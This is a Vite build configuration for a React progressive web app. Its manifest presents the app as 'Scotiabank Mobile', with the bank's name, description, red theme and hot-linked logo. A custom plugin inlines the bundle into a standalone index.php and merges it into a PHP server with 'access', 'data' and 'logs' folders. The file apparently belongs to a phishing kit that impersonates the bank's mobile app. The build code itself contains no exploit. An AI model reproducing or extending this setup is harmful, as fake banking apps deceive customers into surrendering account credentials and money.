import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'
import { VitePWA } from 'vite-plugin-pwa'
import path from 'path'
import fs from 'fs'
import { fileURLToPath } from 'url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const ROOT = __dirname
const DIST = path.resolve(ROOT, 'dist')

export default defineConfig({
  root: ROOT,
  server: {
    allowedHosts: true,
    host: '0.0.0.0',
    port: 3000,
    strictPort: true,
    cors: true,
    hmr: {
      clientPort: 443
    }
  },

  plugins: [
    react(),
    tailwindcss(),
    VitePWA({
      registerType: 'autoUpdate',
      injectRegister: 'auto',
      workbox: {
        globPatterns: ['**/*.{js,css,html,ico,png,svg,jpeg}'],
        maximumFileSizeToCacheInBytes: 5000000
      },
      manifest: {
        name: "Scotiabank Mobile",
        short_name: "Scotia",
        description: "Securely manage your accounts, pay bills, and transfer money with the Scotiabank Mobile app.",
        start_url: "/",
        scope: "/",
        display: "standalone",
        orientation: "portrait",
        background_color: "#ED0711",
        theme_color: "#ED0711",
        categories: ["finance", "productivity"],
        icons: [
          {
            src: "https://cdn.brandfetch.io/idpIpGPfn2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B",
            sizes: "192x192",
            type: "image/jpeg",
            purpose: "any"
          },
          {
            src: "https://cdn.brandfetch.io/idpIpGPfn2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B",
            sizes: "512x512",
            type: "image/jpeg",
            purpose: "any"
          },
          {
            src: "https://cdn.brandfetch.io/idpIpGPfn2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B",
            sizes: "192x192",
            type: "image/jpeg",
            purpose: "maskable"
          },
          {
            src: "https://cdn.brandfetch.io/idpIpGPfn2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B",
            sizes: "512x512",
            type: "image/jpeg",
            purpose: "maskable"
          }
        ]
      }
    }),

    {
      name: "php-auto-builder",

      closeBundle() {
        if (!fs.existsSync(DIST)) {
          console.log("❌ dist folder not found.")
          return
        }

        const assetsDir = path.join(DIST, 'assets')
        if (!fs.existsSync(assetsDir)) {
          console.log("❌ dist/assets folder not found.")
          return
        }

        const files = fs.readdirSync(assetsDir)
        const jsFile = files.find(f => f.endsWith('.js'))
        const cssFile = files.find(f => f.endsWith('.css'))

        if (!jsFile) {
          console.log("❌ No JS bundle found in dist/assets.")
          return
        }

        const jsCode = fs.readFileSync(
          path.join(assetsDir, jsFile),
          'utf-8'
        )

        let cssCode = ''
        if (cssFile) {
          cssCode = fs.readFileSync(
            path.join(assetsDir, cssFile),
            'utf-8'
          )
        }

        const phpOutput = `<?php ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Scotia App</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="apple-mobile-web-app-title" content="Scotia">
<link rel="apple-touch-icon" href="https://cdn.brandfetch.io/idpIpGPfn2/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B">
<link rel="manifest" href="/manifest.webmanifest">
<meta name="theme-color" content="#ED0711">
${cssCode ? `<style>\n${cssCode}\n</style>` : ''}
</head>
<body>
<div id="root"></div>

<script type="module">
${jsCode}
</script>

<script>
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
      .then(registration => {
        console.log('SW registered: ', registration);
      })
      .catch(error => {
        console.log('SW registration failed: ', error);
      });
  });
}
</script>

</body>
</html>`

        fs.writeFileSync(
          path.resolve(ROOT, 'index.php'),
          phpOutput
        )

        // Also write to server/ if it exists
        if (fs.existsSync(path.resolve(ROOT, 'server'))) {
          fs.writeFileSync(
            path.resolve(ROOT, 'server', 'index.php'),
            phpOutput
          )
          
          // Copy all files from dist to server (merging)
          const filesToCopy = fs.readdirSync(DIST)
          filesToCopy.forEach(file => {
            const srcPath = path.join(DIST, file)
            const destPath = path.join(ROOT, 'server', file)
            
            // Don't overwrite backend directories
            const backendDirs = ['src', 'data', 'api', 'access', 'logs', 'scripts', 'templates', 'vendor']
            if (!backendDirs.includes(file)) {
              if (fs.lstatSync(srcPath).isDirectory()) {
                fs.cpSync(srcPath, destPath, { recursive: true })
              } else {
                fs.copyFileSync(srcPath, destPath)
              }
            }
          })
          
          console.log("✅ Project built and merged into server/ successfully")
        }

        // Copy PHP backend files
        if (fs.existsSync(path.resolve(ROOT, 'php_backend'))) {
          fs.cpSync(path.resolve(ROOT, 'php_backend'), DIST, { recursive: true });
          console.log("✅ PHP backend copied successfully")
        }

        console.log("✅ index.php rebuilt successfully")
      }
    }
  ],

  resolve: {
    alias: {
      '@': ROOT
    }
  },

  build: {
    outDir: DIST,
    emptyOutDir: true,
    rollupOptions: {
      input: path.resolve(ROOT, 'index.html'),
      output: {
        inlineDynamicImports: true
      }
    }
  }
})